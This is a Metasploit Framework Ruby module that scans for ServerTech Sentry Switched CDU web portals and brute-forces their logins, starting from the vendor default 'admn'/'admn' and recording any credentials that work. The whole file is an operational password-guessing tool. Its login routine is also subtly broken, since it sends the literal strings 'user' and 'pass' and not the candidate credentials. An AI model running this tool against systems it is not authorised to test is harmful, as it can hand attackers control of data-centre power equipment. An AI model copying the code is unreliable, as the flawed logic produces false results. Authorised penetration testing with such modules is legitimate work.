##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Sentry Switched CDU Bruteforce Login Utility',
			'Description'    => %{
				This module scans for ServerTech's Sentry Switched CDU (Cabinet Power Distribution Unit) web login portals, and performs login brute force to identify valid credentials.
Vendor site: www.servertech.com.
			},
			'Author'         =>
				[
					'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
				],
			'License'        => MSF_LICENSE
		))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'admn'", "admn"]),
				OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'admn'", "admn"])
			], self.class)
	end

	def run_host(ip)
		unless check_conn?
			print_error("#{rhost}:#{rport} - Connection failed, Aborting...")
			return
		end

		unless is_app_sentry?
			print_error("#{rhost}:#{rport} - Application does not appear to be Sentry Switched CDU. Module will not continue.")
			return
		end

		print_status("#{rhost}:#{rport} - Starting login brute force...")
		each_user_pass do |user, pass|
			do_login(user, pass)
		end
	end

	def check_conn?
		begin
			res = send_request_cgi(
			{
				'uri'       => '/',
				'method'    => 'GET'
			})
			print_good("#{rhost}:#{rport} - Server is responsive...")
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
			return
		end
	end

	#
	# What's the point of running this module if the app actually isn't Sentry
	#

	def is_app_sentry?
			res = send_request_cgi(
			{
				'uri'       => '/',
				'method'    => 'GET'
			})

			if (res and res.body.include?("Sentry Switched CDU"))
				p_name = 'ServerTech Sentry Switched CDU'
				print_good("#{rhost}:#{rport} - Running #{p_name}")
				return true
			else
				return false
			end
	end

	#
	# Brute-force the login page
	#

	def do_login(user, pass)
		vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
		begin
			res = send_request_cgi(
			{
				'uri'       => '/',
				'method'    => 'GET',
				'authorization' => basic_auth('user','pass')
			})

			if (res and res.headers['Set-Cookie'])
				print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")


				report_hash = {
					:host   => rhost,
					:port   => rport,
					:sname  => 'ServerTech Sentry Switched CDU',
					:user   => user,
					:pass   => pass,
					:active => true,
					:type => 'password'
				}

				report_auth_info(report_hash)
				return :next_user

			else
				vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
			print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
			return :abort
		end
	end
end
